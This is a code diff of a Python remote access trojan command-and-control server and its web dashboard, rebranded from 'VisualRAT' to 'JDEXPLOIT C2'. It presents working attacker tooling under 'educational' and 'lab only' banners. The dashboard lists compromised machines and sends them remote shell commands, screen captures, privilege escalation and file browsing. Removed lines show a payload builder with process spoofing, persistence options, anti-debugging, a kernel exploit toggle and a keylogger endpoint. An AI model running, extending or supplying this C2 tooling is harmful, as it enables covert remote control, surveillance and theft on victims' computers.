+                        <button class="btn" onclick="sendTerminalCommand()" id="terminal-send" disabled>EXECUTE</button>
                     </div>
                 </div>
                 
-                <!-- Screenshot Viewer -->
+                <!-- SCREENSHOT VIEWER -->
                 <div class="screenshot-viewer" id="screenshot-panel" style="display: none;">
-                    <h3 style="color: #e0e0e0; margin-bottom: 15px;">
-                        <i class="fas fa-camera"></i> Live Screen
+                    <h3 style="color: #ff0000; margin-bottom: 20px; font-family: 'Orbitron', sans-serif;">
+                        📸 LIVE SCREEN CAPTURE
                     </h3>
                     <img id="screenshot-img" class="screenshot-image" src="" alt="Screenshot">
                 </div>
                 
-                <!-- Builder Panel -->
-                <div class="builder-panel">
-                    <h3 style="color: #e0e0e0; margin-bottom: 20px;">
-                        <i class="fas fa-hammer"></i> Client Builder
-                    </h3>
-                    
-                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
-                        <div>
-                            <div class="form-group">
-                                <label>🔌 C2 Server IP</label>
-                                <input type="text" id="builder-ip" value="{HOST}" placeholder="192.168.1.100">
-                            </div>
-                            
-                            <div class="form-group">
-                                <label>🔌 C2 Port</label>
-                                <input type="text" id="builder-port" value="{C2_PORT}">
-                            </div>
-                            
-                            <div class="form-group">
-                                <label>📦 Mutex Name</label>
-                                <input type="text" id="builder-mutex" value="VisualRAT_Global_{random.randint(1000,9999)}">
-                            </div>
-                            
-                            <div class="form-group">
-                                <label>🎭 Process Spoof</label>
-                                <select id="builder-spoof">
-                                    <option value="svchost.exe">svchost.exe (Windows)</option>
-                                    <option value="explorer.exe">explorer.exe</option>
-                                    <option value="winlogon.exe">winlogon.exe</option>
-                                    <option value="csrss.exe">csrss.exe</option>
-                                </select>
-                            </div>
-                        </div>
-                        
-                        <div>
-                            <div class="form-group">
-                                <label>🛡️ Persistence Method</label>
-                                <select id="builder-persist">
-                                    <option value="registry">Registry Run</option>
-                                    <option value="scheduled">Scheduled Task</option>
-                                    <option value="startup">Startup Folder</option>
-                                    <option value="all">ALL METHODS</option>
-                                </select>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label>🚀 Elevation</label>
-                                <select id="builder-elevate">
-                                    <option value="true">Enable Kernel Exploit (CVE-2024-21338)</option>
-                                    <option value="false">Disable</option>
-                                </select>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label>🎯 Anti-Debug</label>
-                                <select id="builder-antidebug">
-                                    <option value="true">Enable (Recommended)</option>
-                                    <option value="false">Disable</option>
-                                </select>
-                            </div>
-                            
-                            <div style="margin-top: 30px;">
-                                <button class="btn btn-primary" onclick="buildClient()" style="width: 100%; padding: 15px;">
-                                    <i class="fas fa-cog"></i> GENERATE CLIENT .EXE
-                                </button>
-                                <div id="build-progress" style="margin-top: 15px; display: none;">
-                                    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
-                                        <span>Building...</span>
-                                        <span id="build-percent">0%</span>
-                                    </div>
-                                    <div class="progress-bar">
-                                        <div id="build-progress-fill" class="progress-fill"></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
+                <!-- FOOTER - JDEXPLOIT -->
+                <div class="footer">
+                    <div class="autor">🔴 JDEXPLOIT 🔴</div>
+                    <div class="copy">██████ RED TEAM OPERATOR ██████</div>
+                    <div style="color: #ff3333; margin-top: 15px; font-size: 12px;">
+                        ⚡ SOLO ENTORNOS AUTORIZADOS • EDUCATIONAL PURPOSE ONLY ⚡
+                    </div>
+                    <div style="color: #660000; margin-top: 20px; letter-spacing: 2px;">
+                        ───━═══ RED/BLACK EDITION v1.0 ═══━───
                     </div>
                 </div>
             </div>
@@ -792,222 +678,184 @@ class WebHandler(server.BaseHTTPRequestHandler):
             <script src="https://kit.fontawesome.com/8d4a5b8c5b.js" crossorigin="anonymous"></script>
             <script>
                 // =================================================================
-                // VisualRAT C2 - Dashboard JavaScript
+                // JDEXPLOIT C2 - RED/BLACK EDITION
                 // =================================================================
                 
                 let currentClientId = null;
-                let clients = {{}};
-                let terminalHistory = [];
+                let clients = {};
                 
-                // Actualizar clientes cada 2 segundos
                 setInterval(loadClients, 2000);
                 setInterval(updateStats, 2000);
                 
-                function loadClients() {{
+                function loadClients() {
                     fetch('/api/clients')
                         .then(r => r.json())
-                        .then(data => {{
-                            clients = {{}};
+                        .then(data => {
+                            clients = {};
                             data.forEach(c => clients[c.id] = c);
                             renderClients(data);
-                        }});
-                }}
+                        });
+                }
                 
-                function renderClients(clients) {{
+                function renderClients(clientsList) {
                     const container = document.getElementById('clients-container');
                     container.innerHTML = '';
                     
-                    clients.forEach(client => {{
+                    clientsList.forEach(client => {
                         const card = document.createElement('div');
-                        card.className = `client-card ${{client.status}}`;
+                        card.className = 'client-card ' + client.status;
                         card.innerHTML = `
                             <div class="client-header">
-                                <span class="client-id">${{client.id}}</span>
-                                <span class="status-badge ${{client.status}}">${{client.status}}</span>
+                                <span class="client-id">🔴 ${client.id}</span>
+                                <span class="status-badge ${client.status}">${client.status}</span>
                             </div>
                             <div class="client-info">
                                 <div class="info-item">
-                                    <div class="info-label">Hostname</div>
-                                    <div class="info-value">${{client.hostname}}</div>
+                                    <div class="info-label">HOSTNAME</div>
+                                    <div class="info-value">${client.hostname}</div>
                                 </div>
                                 <div class="info-item">
-                                    <div class="info-label">Username</div>
-                                    <div class="info-value">${{client.username}}</div>
+                                    <div class="info-label">USERNAME</div>
+                                    <div class="info-value">${client.username}</div>
                                 </div>
                                 <div class="info-item">
-                                    <div class="info-label">IP Address</div>
-                                    <div class="info-value">${{client.ip}}</div>
+                                    <div class="info-label">IP ADDRESS</div>
+                                    <div class="info-value">${client.ip}</div>
                                 </div>
                                 <div class="info-item">
                                     <div class="info-label">OS</div>
-                                    <div class="info-value">${{client.os}}</div>
+                                    <div class="info-value">${client.os}</div>
                                 </div>
                                 <div class="info-item">
-                                    <div class="info-label">Privilege</div>
-                                    <div class="info-value" style="color: ${{client.privilege == 'SYSTEM' ? '#00ff9d' : '#ffaa00'}};">
-                                        ${{client.privilege}}
+                                    <div class="info-label">PRIVILEGE</div>
+                                    <div class="info-value" style="color: ${client.privilege == 'SYSTEM' ? '#ff0000' : '#ff9999'};">
+                                        ${client.privilege}
                                     </div>
                                 </div>
                                 <div class="info-item">
-                                    <div class="info-label">AV</div>
-                                    <div class="info-value">${{client.antivirus}}</div>
+                                    <div class="info-label">ANTIVIRUS</div>
+                                    <div class="info-value">${client.antivirus}</div>
                                 </div>
                             </div>
                             <div class="client-actions">
-                                <button class="btn" onclick="selectClient('${{client.id}}')">
-                                    <i class="fas fa-terminal"></i> Shell
+                                <button class="btn" onclick="selectClient('${client.id}')">
+                                    <i class="fas fa-terminal"></i> SHELL
                                 </button>
-                                <button class="btn" onclick="takeScreenshot('${{client.id}}')">
-                                    <i class="fas fa-camera"></i> Screen
+                                <button class="btn" onclick="takeScreenshot('${client.id}')">
+                                    <i class="fas fa-camera"></i> SCREEN
                                 </button>
-                                <button class="btn" onclick="elevateClient('${{client.id}}')">
-                                    <i class="fas fa-shield-alt"></i> Elevate
+                                <button class="btn" onclick="elevateClient('${client.id}')">
+                                    <i class="fas fa-shield-alt"></i> ELEVATE
                                 </button>
-                                <button class="btn" onclick="openFileManager('${{client.id}}')">
-                                    <i class="fas fa-folder"></i> Files
+                                <button class="btn" onclick="openFileManager('${client.id}')">
+                                    <i class="fas fa-folder"></i> FILES
                                 </button>
                             </div>
                         `;
                         container.appendChild(card);
-                    }});
-                }}
+                    });
+                }
                 
-function selectClient(clientId) {
-    currentClientId = clientId;
-    
-    if (typeof clients !== 'undefined' && clients[clientId]) {
-        document.getElementById('current-client-label').innerHTML = '(' + clients[clientId].hostname + ' - ' + clientId + ')';
-        addToTerminal('[+] Connected to client: ' + clients[clientId].hostname + ' (' + clientId + ')', '#00ff9d');
-        addToTerminal('[+] OS: ' + clients[clientId].os + ' | User: ' + clients[clientId].username + ' | Priv: ' + clients[clientId].privilege, '#8b949e');
-    } else {
-        document.getElementById('current-client-label').innerHTML = '(' + clientId + ')';
-        addToTerminal('[+] Connected to client: ' + clientId, '#00ff9d');
-    }
-    
-    document.getElementById('terminal-cmd').disabled = false;
-    document.getElementById('terminal-send').disabled = false;
-}
+                function selectClient(clientId) {
+                    currentClientId = clientId;
+                    
+                    if (clients[clientId]) {
+                        document.getElementById('current-client-label').innerHTML = 
+                            '(' + clients[clientId].hostname + ' - ' + clientId + ')';
+                        addToTerminal('[🔥] Connected to: ' + clients[clientId].hostname + ' (' + clientId + ')', '#ff0000');
+                        addToTerminal('[•] OS: ' + clients[clientId].os + ' | User: ' + clients[clientId].username + 
+                                   ' | Priv: ' + clients[clientId].privilege, '#ff6666');
+                    }
+                    
+                    document.getElementById('terminal-cmd').disabled = false;
+                    document.getElementById('terminal-send').disabled = false;
+                }
                 
-                function sendTerminalCommand() {{
+                function sendTerminalCommand() {
                     const cmd = document.getElementById('terminal-cmd').value;
                     if (!cmd || !currentClientId) return;
                     
-                    addToTerminal(`> ${cmd}`, '#e0e0e0');
+                    addToTerminal('> ' + cmd, '#ff9999');
                     document.getElementById('terminal-cmd').value = '';
                     
-                    fetch('/api/command', {{
+                    fetch('/api/command', {
                         method: 'POST',
-                        headers: {{'Content-Type': 'application/json'}},
-                        body: JSON.stringify({{
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
                             client_id: currentClientId,
                             command: cmd.split(' ')[0],
                             args: cmd.substring(cmd.indexOf(' ') + 1)
-                        }})
-                    }})
+                        })
+                    })
                     .then(r => r.json())
-                    .then(data => {{
+                    .then(data => {
                         addToTerminal(data.response, '#cccccc');
-                    }});
-                }}
+                    });
+                }
                 
-                function takeScreenshot(clientId) {{
+                function takeScreenshot(clientId) {
                     document.getElementById('screenshot-panel').style.display = 'block';
-                    document.getElementById('screenshot-img').src = `/api/screenshot/${clientId}?t=${Date.now()}`;
-                }}
+                    document.getElementById('screenshot-img').src = '/api/screenshot/' + clientId + '?t=' + Date.now();
+                }
                 
-                function elevateClient(clientId) {{
-                    addToTerminal('[!] Attempting kernel privilege escalation (CVE-2024-21338)...', '#ffaa00');
+                function elevateClient(clientId) {
+                    addToTerminal('[⚠️] Attempting privilege escalation...', '#ffaa00');
                     
-                    fetch('/api/command', {{
+                    fetch('/api/command', {
                         method: 'POST',
-                        headers: {{'Content-Type': 'application/json'}},
-                        body: JSON.stringify({{
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
                             client_id: clientId,
                             command: 'ELEVATE',
                             args: ''
-                        }})
-                    }})
+                        })
+                    })
                     .then(r => r.json())
-                    .then(data => {{
+                    .then(data => {
                         addToTerminal(data.response, data.response.includes('[+]') ? '#00ff9d' : '#ff4d4d');
-                        if (data.response.includes('[+]')) {{
-                            addToTerminal('[+] TOKEN ELEVATED TO SYSTEM!', '#00ff9d');
-                            setTimeout(() => loadClients(), 2000);
-                        }}
-                    }});
-                }}
+                    });
+                }
                 
-                function openFileManager(clientId) {{
-                    const path = prompt('Remote path to browse:', 'C:\\Users');
-                    if (path) {{
-                        fetch('/api/command', {{
+                function openFileManager(clientId) {
+                    const path = prompt('Remote path:', 'C:\\Users');
+                    if (path) {
+                        fetch('/api/command', {
                             method: 'POST',
-                            headers: {{'Content-Type': 'application/json'}},
-                            body: JSON.stringify({{
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
                                 client_id: clientId,
                                 command: 'DIR',
                                 args: path
-                            }})
-                        }})
+                            })
+                        })
                         .then(r => r.json())
-                        .then(data => {{
-                            addToTerminal(`[DIR] ${path}\\n${data.response}`, '#cccccc');
-                        }});
-                    }}
-                }}
+                        .then(data => {
+                            addToTerminal('[DIR] ' + path + '\\n' + data.response, '#cccccc');
+                        });
+                    }
+                }
                 
-                function addToTerminal(text, color = '#e0e0e0') {{
+                function addToTerminal(text, color = '#ff9999') {
                     const output = document.getElementById('terminal-output');
                     const line = document.createElement('div');
                     line.style.color = color;
-                    line.style.marginBottom = '3px';
+                    line.style.marginBottom = '5px';
                     line.style.fontFamily = 'Courier New';
+                    line.style.borderLeft = color === '#ff0000' ? '3px solid #ff0000' : 'none';
+                    line.style.paddingLeft = color === '#ff0000' ? '10px' : '0';
                     line.innerHTML = text.replace(/\\n/g, '<br>');
                     output.appendChild(line);
                     output.scrollTop = output.scrollHeight;
-                }}
+                }
                 
-                function clearTerminal() {{
+                function clearTerminal() {
                     const output = document.getElementById('terminal-output');
-                    output.innerHTML = '<span style="color: #00ff9d;">[VisualRAT C2 Ready]</span><br><span style="color: #8b949e;">Select a client to begin remote control</span><br><br>';
-                }}
+                    output.innerHTML = '<span style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</span><br>' +
+                                     '<span style="color: #ff6666;">[•] Select a client to begin remote control</span><br>' +
+                                     '<span style="color: #ff3333;">[•] Commands: shell, exec, screenshot, elevate, info</span><br><br>';
+                }
                 
-                function buildClient() {{
-                    const config = {{
-                        ip: document.getElementById('builder-ip').value,
-                        port: parseInt(document.getElementById('builder-port').value),
-                        mutex: document.getElementById('builder-mutex').value,
-                        spoof: document.getElementById('builder-spoof').value,
-                        persist: document.getElementById('builder-persist').value,
-                        elevate: document.getElementById('builder-elevate').value === 'true',
-                        antidebug: document.getElementById('builder-antidebug').value === 'true'
-                    }};
-                    
-                    document.getElementById('build-progress').style.display = 'block';
-                    let progress = 0;
-                    const interval = setInterval(() => {{
-                        progress += 10;
-                        document.getElementById('build-progress-fill').style.width = progress + '%';
-                        document.getElementById('build-percent').innerText = progress + '%';
-                        
-                        if (progress >= 100) {{
-                            clearInterval(interval);
-                            setTimeout(() => {{
-                                alert('[+] Client built successfully!\\n[+] Location: ./visualrat_client.exe');
-                                document.getElementById('build-progress').style.display = 'none';
-                                document.getElementById('build-progress-fill').style.width = '0%';
-                            }}, 500);
-                        }}
-                    }}, 200);
-                    
-                    fetch('/build', {{
-                        method: 'POST',
-                        headers: {{'Content-Type': 'application/json'}},
-                        body: JSON.stringify(config)
-                    }});
-                }}
-                
-                function updateStats() {{
+                function updateStats() {
                     const total = Object.keys(clients).length;
                     const online = Object.values(clients).filter(c => c.status === 'online').length;
                     const system = Object.values(clients).filter(c => c.privilege === 'SYSTEM').length;
@@ -1021,8 +869,10 @@ function selectClient(clientId) {
                     const minutes = Math.floor((uptime % 3600) / 60);
                     const seconds = uptime % 60;
                     document.getElementById('uptime').innerText = 
-                        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                }}
+                        hours.toString().padStart(2, '0') + ':' + 
+                        minutes.toString().padStart(2, '0') + ':' + 
+                        seconds.toString().padStart(2, '0');
+                }
                 
                 window.startTime = Date.now();
                 loadClients();
@@ -1030,14 +880,12 @@ function selectClient(clientId) {
         </body>
         </html>
         """
-        
         self.wfile.write(html.encode())
     
     def send_clients(self):
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
         self.end_headers()
-        
         clients_list = [client.to_dict() for client in WebHandler.c2.clients.values()]
         self.wfile.write(json.dumps(clients_list).encode())
     
@@ -1045,51 +893,10 @@ function selectClient(clientId) {
         self.send_response(200)
         self.send_header('Content-type', 'image/png')
         self.end_headers()
-        
         if client_id in WebHandler.c2.clients:
             response = WebHandler.c2.send_command(client_id, "SCREENSHOT")
             if response and not response.startswith("[-]"):
                 self.wfile.write(base64.b64decode(response))
-    
-    def send_keylog(self, client_id):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        
-        if client_id in WebHandler.c2.clients:
-            response = WebHandler.c2.send_command(client_id, "KEYLOG")
-            self.wfile.write(response.encode())
-    
-    def send_processes(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'application/json')
-        self.end_headers()
-        
-        if WebHandler.c2.current_client:
-            response = WebHandler.c2.send_command(WebHandler.c2.current_client.id, "PROCESSES")
-            self.wfile.write(json.dumps({'processes': response}).encode())
-    
-    def send_js(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'application/javascript')
-        self.end_headers()
-        self.wfile.write(b'// JavaScript loaded')
-    
-    def send_css(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/css')
-        self.end_headers()
-        self.wfile.write(b'/* CSS loaded */')
-    
-    def send_builder(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(b'<h1>Builder</h1>')
-    
-    def build_client(self, config):
-        # Generar cliente C++ con la configuración
-        return "[+] Client built successfully: visualrat_client.exe"
     
     def log_message(self, format, *args):
         pass
@@ -1098,37 +905,39 @@ class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
     pass
 
 # ============================================================================
-# MAIN
+# MAIN - JDEXPLOIT
 # ============================================================================
 def main():
-    print(f"""{Colors.HEADER}
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                     VisualRAT C2 - Educational Edition                       ║
-║                  Remote Administration Tool - SOLO LABORATORIO               ║
-║                     Interfaz Visual como AsyncRAT en C++                     ║
+    print(f"""
+{Colors.RED}╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                              ║
+║                     🔴 JDEXPLOIT C2 - RED/BLACK EDITION 🔴                   ║
+║                          Remote Administration Tool                          ║
+║                          SOLO ENTORNO DE LABORATORIO                         ║
+║                                                                              ║
+║                        ⚡ BY JDEXPLOIT ⚡ v1.0                               ║
+║                                                                              ║
 ╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
     
-{Colors.CYAN}📡 C2 Core:{Colors.END}     {HOST}:{C2_PORT}
-{Colors.CYAN}🌐 Web UI:{Colors.END}     http://{HOST}:{WEB_PORT}
-{Colors.CYAN}🔐 Encryption:{Colors.END}  AES-256-GCM
-{Colors.CYAN}💻 Platform:{Colors.END}    Windows 11 Client (C++ Native) / Kali Server
-{Colors.CYAN}🚀 Kernel:{Colors.END}      CVE-2024-21338 (Educational Research)
-{Colors.CYAN}⚡ Status:{Colors.END}       {Colors.GREEN}READY{Colors.END}
+{Colors.RED}[🔥]{Colors.END} C2 Core:     {Colors.WHITE}{HOST}:{C2_PORT}{Colors.END}
+{Colors.RED}[🔥]{Colors.END} Web UI:      {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}
+{Colors.RED}[🔥]{Colors.END} Platform:    {Colors.WHITE}Windows 11 Client / Kali Server{Colors.END}
+{Colors.RED}[🔥]{Colors.END} Author:      {Colors.WHITE}JDEXPLOIT{Colors.END}
+{Colors.RED}[🔥]{Colors.END} Status:      {Colors.RED}ACTIVE{Colors.END}
     """)
     
-    # Iniciar C2 Core
     c2 = C2Core()
     c2.start()
     
-    # Iniciar Web Server
     WebHandler.c2 = c2
     web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
-    print(f"{Colors.GREEN}[+] Web dashboard: http://{HOST}:{WEB_PORT}{Colors.END}")
+    print(f"{Colors.RED}[🔥]{Colors.END} Web dashboard: {Colors.WHITE}http://{HOST}:{WEB_PORT}{Colors.END}")
+    print(f"{Colors.RED}[🔥]{Colors.END} {Colors.WHITE}Press Ctrl+C to stop{Colors.END}")
     
     try:
         web_server.serve_forever()
     except KeyboardInterrupt:
-        print(f"\n{Colors.WARNING}[!] Shutting down...{Colors.END}")
+        print(f"\n{Colors.RED}[⚠️] Shutting down...{Colors.END}")
         c2.running = False
         sys.exit(0)
 
